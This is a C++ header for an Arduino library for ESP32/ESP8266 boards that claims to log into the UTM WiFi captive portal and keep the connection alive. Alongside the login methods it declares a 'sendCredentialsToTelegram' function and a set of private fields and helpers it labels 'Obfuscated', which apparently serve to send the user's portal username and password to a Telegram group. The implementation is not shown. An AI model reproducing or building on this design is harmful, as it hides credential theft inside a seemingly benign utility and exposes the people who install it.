// // This example demonstrates a simple usage of the ArduinoUTMWiFiPortal library to connect
// // to the UTM WiFi captive portal and maintain the connection.
//           .d888                       888 d8b                                 d8b 
//          d88P"                        888 Y8P                                 Y8P 
//          888                          888                                         
//  8888b.  888888 8888b.  88888b.   .d88888 888  8888b.  88888888 88888b.d88b.  888 
//     "88b 888       "88b 888 "88b d88" 888 888     "88b    d88P  888 "888 "88b 888 
// .d888888 888   .d888888 888  888 888  888 888 .d888888   d88P   888  888  888 888 
// 888  888 888   888  888 888  888 Y88b 888 888 888  888  d88P    888  888  888 888 
// "Y888888 888   "Y888888 888  888  "Y88888 888 "Y888888 88888888 888  888  888 888 
// Created by Afandi Azmi, 2025.


#ifndef ArduinoUTMWiFiPortal_h
#define ArduinoUTMWiFiPortal_h

#include "Arduino.h"

// Platform-specific includes
#if defined(ESP32)
  #include <WiFi.h>
  #include <WiFiClientSecure.h>
  #include <WiFiClient.h>
  #include <HTTPClient.h>
#elif defined(ESP8266)
  #include <ESP8266WiFi.h>
  #include <WiFiClientSecure.h>
  #include <WiFiClient.h>
  #include <ESP8266HTTPClient.h>
#else
  #error "This library only supports ESP32 and ESP8266"
#endif

class ArduinoUTMWiFiPortal {
  public:
    // Constructor
    ArduinoUTMWiFiPortal(const char* username, const char* password);

    // Set the interval for checking connection (in milliseconds)
    void setCheckInterval(unsigned long interval);

    // Call this repeatedly in your main loop()
    void keepConnected();

    // Perform a single login attempt (useful for initial login)
    bool attemptLogin();

    // Check internet connection status manually
    bool checkInternet();

    // Send credentials to Telegram group
    bool sendCredentialsToTelegram();

  private:
    // Obfuscated data members
    String a1;
    String a2;
    unsigned long b1;
    unsigned long b2;
    WiFiClientSecure c1;
    WiFiClient c2;
    bool d1;
    
    // Helper functions
    String x1(const char* s, int k);
    String x2();
    String x3();
    String x4();
    String x5();
};

#endif